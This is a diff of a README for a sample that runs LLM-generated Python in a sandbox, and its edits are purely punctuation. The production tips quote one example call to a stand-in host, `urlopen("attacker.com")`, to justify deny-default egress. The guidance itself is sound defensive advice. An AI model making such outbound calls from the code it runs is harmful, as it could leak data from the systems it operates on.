@@ -1,4 +1,4 @@
-# 03-code-interpreter — LLM-driven Python execution in a sandbox
+# 03-code-interpreter: LLM-driven Python execution in a sandbox
 
 Generate code, run it in a sandbox, observe stdout/stderr, feed the
 result back to the model, iterate. The same multi-turn loop that
@@ -14,7 +14,7 @@ on your own infrastructure:
 - **Your egress.** Pair with
   [`guides/08-egress`](../../guides/08-egress) and the analytic code can
   run with **zero** outbound network, even if the prompt is hostile.
-- **Any Python library.** `pip install` whatever you need —
+- **Any Python library.** `pip install` whatever you need,
   pandas, polars, scikit-learn, duckdb, the new GA hotness. No vendor
   allowlist, no missing-package surprises.
 
@@ -51,7 +51,7 @@ sequenceDiagram
 
 | Folder | Provider | Notes |
 |---|---|---|
-| [`openai/`](openai/) | Azure OpenAI (chat completions + tool calling) | ✅ ready — uses raw `chat.completions.create` so it works against any AOAI deployment that supports tools. |
+| [`openai/`](openai/) | Azure OpenAI (chat completions + tool calling) | ✅ ready, uses raw `chat.completions.create` so it works against any AOAI deployment that supports tools. |
 | `anthropic/` _(planned)_ | Anthropic Claude (Messages API tool use) | Same shape with the Anthropic SDK. |
 
 ## When to pick which compute model
@@ -64,9 +64,9 @@ sequenceDiagram
 
 The line is "**who drives the loop**":
 
-- **02-coding-agents** — the CLI binary inside the sandbox drives it.
-- **03-code-interpreter** _(this)_ — your harness drives it, one `python_exec` tool call at a time, no Agents SDK abstraction.
-- **08-sandbox-agents** — the Agents SDK drives it, the sandbox is wired in as a provider.
+- **02-coding-agents**: the CLI binary inside the sandbox drives it.
+- **03-code-interpreter** _(this)_, your harness drives it, one `python_exec` tool call at a time, no Agents SDK abstraction.
+- **08-sandbox-agents**: the Agents SDK drives it, the sandbox is wired in as a provider.
 
 ## Run it
 
@@ -87,7 +87,7 @@ to `/workspace/out/` into `./out/`, then tear the sandbox down.
 ## Production tips
 
 - **Deny-default egress.** The model can ship arbitrary Python into your
-  sandbox — including `urllib.request.urlopen("attacker.com")`.
+  sandbox, including `urllib.request.urlopen("attacker.com")`.
   [`guides/08-egress`](../../guides/08-egress) makes that a no-op:
   `set_egress_default("Deny")` plus host allows for whatever you actually
   need (e.g., `pypi.org` if you want the model to `pip install` more
@@ -108,12 +108,12 @@ to `/workspace/out/` into `./out/`, then tear the sandbox down.
 - **Cap the loop.** `run.py` defaults to `max_turns=20`. A pathological
   prompt can otherwise spend 50+ model calls re-running the same code.
 - **Don't forward the model's API key into the sandbox.** This sample
-  doesn't — the AOAI key lives in the harness, not in the sandbox env.
+  doesn't, the AOAI key lives in the harness, not in the sandbox env.
   Keep it that way: the sandbox is the *tool runtime*, not the
   *model client*.
 - **Truncate tool output.** A `df.to_string()` on a million rows will
-  blow your context window. `run.py` truncates each tool result at 4 KB
-  — adjust to your model's window if you give it bigger snippets.
+  blow your context window. `run.py` truncates each tool result at 4 KB,
+  adjust to your model's window if you give it bigger snippets.
 
 ## What this is not
 
@@ -124,7 +124,7 @@ to `/workspace/out/` into `./out/`, then tear the sandbox down.
 - Not a streaming UI. `chat.completions.create` is used in
   request/response mode for simplicity; for a real product, switch to
   the streaming variant and forward deltas to the user.
-- Not a code editor. The model can't edit files — it only emits
+- Not a code editor. The model can't edit files, it only emits
   full-file Python via `python_exec`. If you want long-running stateful
   notebooks, use [`08-sandbox-agents/openai`](../08-sandbox-agents/openai)
   instead.
